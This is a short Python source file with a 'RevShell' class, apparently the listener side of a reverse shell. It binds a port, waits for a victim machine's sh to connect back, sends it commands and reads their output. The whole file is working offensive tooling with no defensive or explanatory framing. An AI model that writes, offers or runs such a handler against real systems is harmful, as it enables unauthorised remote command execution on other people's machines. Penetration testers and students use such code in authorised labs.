import socket
import time


class RevShell:
    def __init__(self, port=0):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(10)
        self.port = port

        if port == 0:
            self.port = int(input("[$] Input listening port: "))

        self.connection = None
        try:
            self.socket.bind(('0.0.0.0', self.port))
        except:
            print(f"[-] Failed to bind socket to port: {self.port}")

    def acceptConnection(self):
        try:
            self.connection, address = self.socket.accept()
            print(f"[+] Connection Recieved from: {address}")
            self.connection.recv(1024)
        except:
            print(f"[-] Failed to accept connection on port: {self.port}")
            self.closeConnection()

    def startListener(self):
        try:
            self.socket.listen(2)
            print(f"[+] Listening for connections on port: {self.port}")
        except:
            print(f"[-] Failed to start listener on port: {self.port}")
            self.closeConnection()

    def closeConnection(self):
        if self.connection != None:
            self.connection.shutdown(socket.SHUT_RD)

        self.socket.close()
        print("[-] Connection Closed...")

    def interact(self, command, debug=False):
        try:
            self.connection.sendall((command + "\n").encode())
        except:
            print(f"[-] Failed to send command")

        # Connection Process:
        # Start listening
        # Detect Incoming connection
        # Accept Connection
        # Send Command
        # Recieve stdout of command
        # Recieve trailing $ from sh
        # repeat until closed

        response = self.connection.recv(4096)
        if debug:
            print(response)
        self.connection.recv(512)  # Recieve "$" from sh

        return response.decode()
